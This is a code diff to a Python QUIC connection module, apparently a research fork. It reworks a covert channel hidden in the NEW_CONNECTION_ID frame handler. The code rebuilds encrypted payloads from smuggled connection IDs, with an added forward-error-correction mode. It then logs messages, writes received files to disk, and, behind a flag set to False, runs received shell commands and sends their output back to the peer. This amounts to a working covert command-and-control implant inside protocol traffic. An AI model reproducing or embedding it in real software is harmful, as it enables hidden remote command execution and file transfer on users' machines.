@@ -123,11 +123,10 @@ PEER_META = {}
 PEER_META_LOCK = threading.Lock()
 REMOTE_COMMANDS_ENABLED = False
 
-# Improved synchronization constants
-MAX_CID_LENGTH = 20  # Use larger CIDs for better bandwidth (RFC 9000 allows up to 160 bits in frames)
-SEQUENCE_BYTES = 2  # Use 2 bytes for sequence numbers to track order
-SYNC_RECOVERY_TIMEOUT = 30.0  # Seconds before attempting sync recovery
-MAX_BUFFER_AGE = 60.0  # Seconds before clearing stale buffer
+MAX_CID_LENGTH = 20
+SEQUENCE_BYTES = 2
+SYNC_RECOVERY_TIMEOUT = 30.0
+MAX_BUFFER_AGE = 5.0  # UPDATED: Reduced to 5.0s for academic reliability metrics
 
 
 def EPOCHS(shortcut: str) -> FrozenSet[tls.Epoch]:
@@ -2043,41 +2042,47 @@ class QuicConnection:
         retire_prior_to = buf.pull_uint_var()
         length = buf.pull_uint8()
         connection_id = buf.pull_bytes(length)
+        # CRITICAL FIX: Pull token immediately to maintain buffer alignment
+        # This ensures that even if we return early for FEC buffering,
+        # the buffer pointer is positioned correctly for the next frame.
+        stateless_reset_token = buf.pull_bytes(STATELESS_RESET_TOKEN_SIZE)
 
         # Covert channel section
         peer_key = peer_address_key(context.addr, is_client=self._is_client)
         peer_ip = peer_key[0]
+
+        # Acquire lock with timeout to prevent deadlocks
         PEER_META_LOCK.acquire(timeout=5)
         peer_meta = PEER_META.get(peer_key)
         if not peer_meta:
             peer_meta = create_peer_meta()
+
+        # Check if this is a covert packet (not in history)
         if self._original_destination_connection_id not in peer_meta["cid_history"]:
             from . import ccrypto
 
-            # New peer, queue up the public key bytes
-            # if not self._is_client and not peer_meta['cid_history'] and peer_meta['message_history']:
-            #    ccrypto.queue_message(peer_ip, ccrypto.get_compact_key(peer_meta['private_key'].public_key()), peer_meta['cid_queue'], None, is_public_key=True)
-
-            # Keep track of the last CID_HISTORY_LENGTH CIDs so we don't double-write anything when multiple connections
-            # are made with repeat cids
+            # Update History
             peer_meta["cid_history"].append(self._original_destination_connection_id)
             peer_meta["cid_history"] = peer_meta["cid_history"][
                 -1 * CID_HISTORY_LENGTH :
             ]
-            # Add payload to buffer
+
+            # Buffer Payload
             if self._is_client:
                 peer_meta["buffer"].append(connection_id)
             else:
                 peer_meta["buffer"].append(self._original_destination_connection_id)
 
-            # Reset stale/overflow buffers to avoid runaway growth
+            # Cleanup Stale/Overflow Buffers
             now_ts = time.time()
             if not peer_meta["buffer_timestamp"]:
                 peer_meta["buffer_timestamp"] = now_ts
+
             buffer_age = now_ts - peer_meta["buffer_timestamp"]
+            # Enforce 5.0s timeout for academic reliability metrics
             if buffer_age > MAX_BUFFER_AGE or len(peer_meta["buffer"]) > 512:
                 logger.warning(
-                    "Resetting buffer for %s (age=%.1fs, len=%d)",
+                    "Resetting buffer for %s (age=%.1fs, len=%d) - Timeout/Overflow",
                     peer_ip,
                     buffer_age,
                     len(peer_meta["buffer"]),
@@ -2085,20 +2090,18 @@ class QuicConnection:
                 peer_meta["buffer"] = []
                 peer_meta["buffer_timestamp"] = now_ts
 
-            # If we don't have a public key yet, receive the public key
+            # --- Public Key Exchange (Handshake) ---
             if not peer_meta["public_key"]:
+                # Handshake uses Legacy mode (no FEC), expects specific count
                 if len(peer_meta["buffer"]) == RSA_BIT_STRENGTH // 128 + 1:
                     if self._is_client:
-                        # The client will have a dummy cid at the start of the buffer
                         obfuscated_bytes = ccrypto.reconstruct_payload(
                             peer_meta["buffer"][1:], invert=True
                         )
                     else:
-                        # The server will have a dummy cid at the end of the buffer
                         obfuscated_bytes = ccrypto.reconstruct_payload(
                             peer_meta["buffer"][:-1], invert=True
                         )
-                    # Deobfuscate to get actual modulus
                     key_bytes = ccrypto.deobfuscate_modulus(obfuscated_bytes)
                     logger.debug(
                         "My Modulus: %s",
@@ -2109,16 +2112,69 @@ class QuicConnection:
                     peer_meta["buffer"] = []
                     logger.info(f"Received public key from {peer_ip}")
 
-            # If we have a public key, try to decrypt the payload
+            # --- Data Processing ---
             else:
-                # Skip processing if buffer too small (still accumulating CIDs)
                 if len(peer_meta["buffer"]) >= 2:
-                    logger.info(f"PEER_BUFFER_LEN: {len(peer_meta['buffer'])}")
+                    logger.debug(f"PEER_BUFFER_LEN: {len(peer_meta['buffer'])}")
 
                 sequence = None
                 decrypted_payload = None
-                encrypted_payload = ccrypto.reconstruct_payload(peer_meta["buffer"])
+                should_return_early = False
 
+                # 1. Reconstruct Encrypted Payload (Legacy vs FEC)
+                if self._configuration.covert_strategy == "fec":
+                    buf = peer_meta["buffer"]
+                    if buf:
+                        # Peek at first shard to check if we have enough data
+                        # Header: [len%256, n_data, n_parity, shard_idx]
+                        sample_shard = buf[0]
+
+                        if len(sample_shard) >= 4:
+                            n_data = sample_shard[1]
+                            n_parity = sample_shard[2]
+                            expected_total = n_data + n_parity
+
+                            if len(buf) < n_data:
+                                # Not enough shards yet - Return early to keep accumulating
+                                logger.debug(
+                                    "FEC: %d/%d shards received (need %d), waiting...",
+                                    len(buf),
+                                    expected_total,
+                                    n_data,
+                                )
+                                should_return_early = True
+                        else:
+                            logger.warning(
+                                "FEC: Received malformed shard (<4 bytes), resetting"
+                            )
+                            peer_meta["buffer"] = []
+                            # Don't return early, let buffer clear
+                    else:
+                        # Empty buffer, nothing to do
+                        should_return_early = True
+
+                    if not should_return_early:
+                        encrypted_payload = ccrypto.reconstruct_payload_fec(
+                            peer_meta["buffer"], self._configuration.covert_fec_rate
+                        )
+                        if encrypted_payload is None:
+                            logger.warning(
+                                "FEC decode failed (Corruption), clearing buffer"
+                            )
+                            peer_meta["buffer"] = []
+                            peer_meta["buffer_timestamp"] = time.time()
+                            should_return_early = True
+                else:
+                    # Legacy Mode
+                    encrypted_payload = ccrypto.reconstruct_payload(peer_meta["buffer"])
+
+                # Handle Early Return (Release lock first)
+                if should_return_early:
+                    PEER_META[peer_key] = peer_meta
+                    PEER_META_LOCK.release()
+                    return
+
+                # 2. Decrypt Payload
                 # Try session key decryption first (fast path)
                 if peer_meta.get("session_key"):
                     decrypted = ccrypto.decrypt_with_session_key(
@@ -2131,7 +2187,7 @@ class QuicConnection:
                         decrypted_payload = decrypted[SEQUENCE_BYTES:]
                         logger.debug("Decrypted with session key (fast path)")
 
-                # Fallback to RSA decryption (slow path) with sequence
+                # Fallback to RSA decryption (slow path)
                 if decrypted_payload is None:
                     result = ccrypto.try_decrypt_with_sequence(
                         peer_meta["private_key"],
@@ -2152,11 +2208,12 @@ class QuicConnection:
                     if decrypted_payload:
                         sequence = None
 
+                # 3. Handle Decrypted Command
                 if decrypted_payload is not None:
-                    # Sequence check when available
+                    # Sequence check
+                    valid_seq = True
                     if sequence is not None:
                         expected = peer_meta.get("expected_sequence", 0)
-                        # Allow first sync to jump to the sender's current seq
                         if expected == 0:
                             peer_meta["expected_sequence"] = sequence + 1
                             peer_meta["sync_lost"] = False
@@ -2170,63 +2227,60 @@ class QuicConnection:
                             peer_meta["sync_lost"] = True
                             peer_meta["buffer"] = []
                             peer_meta["expected_sequence"] = sequence + 1
-                            PEER_META[peer_key] = peer_meta
-                            PEER_META_LOCK.release()
-                            return
+                            valid_seq = False
                         else:
                             peer_meta["expected_sequence"] = expected + 1
                             peer_meta["sync_lost"] = False
 
-                    peer_meta["buffer"] = []
-                    command = decrypted_payload[0]
-                    decrypted_message = decrypted_payload[1:]
+                    if valid_seq:
+                        peer_meta["buffer"] = []
+                        peer_meta["buffer_timestamp"] = time.time()
+                        command = decrypted_payload[0]
+                        decrypted_message = decrypted_payload[1:]
 
-                    # Save to the message list
-                    message_list = peer_meta["message_history"].get(peer_key, [])
-                    message_list.append(decrypted_message)
-                    peer_meta["message_history"][peer_key] = message_list
+                        message_list = peer_meta["message_history"].get(peer_key, [])
+                        message_list.append(decrypted_message)
+                        peer_meta["message_history"][peer_key] = message_list
 
-                    if command == ord("m"):
-                        # Log the message
-                        logger.info("RECEIVED MESSAGE: %s", decrypted_message)
-                        # Removing message acknowledgement for now. Need a more robust way to do that
-                        # ccrypto.queue_message(peer_ip, f"mm{len(peer_meta['message_history'])}".encode('utf8'), peer_meta['cid_queue'], peer_meta['public_key'])
-                    elif command == ord("f"):
-                        # Save the file
-                        file_prefix = "server-" if self._is_client else "client-"
-                        filename = (
-                            f"{file_prefix}{peer_ip}-message-{len(message_list)}.bin"
-                        )
-                        open(filename, "wb").write(decrypted_message)
-                        logger.info("RECEIVED FILE SAVED TO: %s", filename)
-                        logger.info("FILE BYTES:\n%s", decrypted_message)
-                        # Removing file acknowledgement for now. Need a more robust way to do that
-                        # ccrypto.queue_message(peer_ip, f"mf{len(peer_meta['message_history'])}".encode('utf8'), peer_meta['cid_queue'], peer_meta['public_key'])
-                    elif REMOTE_COMMANDS_ENABLED and command == ord("c"):
-                        logger.info("RECEIVED COMMAND: %s", decrypted_message)
-                        stdout, stderr, return_code = execute_command(decrypted_message)
-                        seq = peer_meta.get("next_sequence", 0)
-                        peer_meta["next_sequence"] = seq + 1
-                        fec_rate = (
-                            self._configuration.covert_fec_rate
-                            if self._configuration.covert_strategy == "fec"
-                            else None
-                        )
-                        ccrypto.queue_message(
-                            host_ip=peer_ip,
-                            payload=f"m:{stdout}\n{stderr}\n{return_code}".encode(
-                                "utf8"
-                            ),
-                            queue=peer_meta["cid_queue"],
-                            public_key=peer_meta["public_key"],
-                            sequence=seq,
-                            session_key=peer_meta.get("session_key"),
-                            fec_rate=fec_rate,
-                        )
-        PEER_META[peer_key] = peer_meta
-        PEER_META_LOCK.release()
+                        if command == ord("m"):
+                            logger.info("RECEIVED MESSAGE: %s", decrypted_message)
+                        elif command == ord("f"):
+                            file_prefix = "server-" if self._is_client else "client-"
+                            filename = f"{file_prefix}{peer_ip}-message-{len(message_list)}.bin"
+                            open(filename, "wb").write(decrypted_message)
+                            logger.info("RECEIVED FILE SAVED TO: %s", filename)
+                        elif REMOTE_COMMANDS_ENABLED and command == ord("c"):
+                            logger.info("RECEIVED COMMAND: %s", decrypted_message)
+                            stdout, stderr, return_code = execute_command(
+                                decrypted_message
+                            )
+                            seq = peer_meta.get("next_sequence", 0)
+                            peer_meta["next_sequence"] = seq + 1
+                            fec_rate = (
+                                self._configuration.covert_fec_rate
+                                if self._configuration.covert_strategy == "fec"
+                                else None
+                            )
+                            ccrypto.queue_message(
+                                host_ip=peer_ip,
+                                payload=f"m:{stdout}\n{stderr}\n{return_code}".encode(
+                                    "utf8"
+                                ),
+                                queue=peer_meta["cid_queue"],
+                                public_key=peer_meta["public_key"],
+                                sequence=seq,
+                                session_key=peer_meta.get("session_key"),
+                                fec_rate=fec_rate,
+                            )
 
-        stateless_reset_token = buf.pull_bytes(STATELESS_RESET_TOKEN_SIZE)
+        # Release lock and continue to standard processing
+        if PEER_META_LOCK.locked():
+            PEER_META[peer_key] = peer_meta
+            PEER_META_LOCK.release()
+
+        # --- Standard QUIC Processing ---
+        # (This is safe now because we already parsed the frame buffer at the top)
+
         if not connection_id or len(connection_id) > CONNECTION_ID_MAX_SIZE:
             raise QuicConnectionError(
                 error_code=QuicErrorCode.FRAME_ENCODING_ERROR,
@@ -2301,12 +2355,7 @@ class QuicConnection:
                 reason_phrase="Too many active connection IDs",
             )
 
-        # Check the number of retired connection IDs pending, though with a safer limit
-        # than the 2x recommended in section 5.1.2 of the RFC.  Note that we are doing
-        # the check here and not in _retire_peer_cid() because we know the frame type to
-        # use here, and because it is the new connection id path that is potentially
-        # dangerous.  We may transiently go a bit over the limit due to unacked frames
-        # getting added back to the list, but that's ok as it is bounded.
+        # Check the number of retired connection IDs pending
         if len(self._retire_connection_ids) > min(
             self._local_active_connection_id_limit * 4, MAX_PENDING_RETIRES
         ):
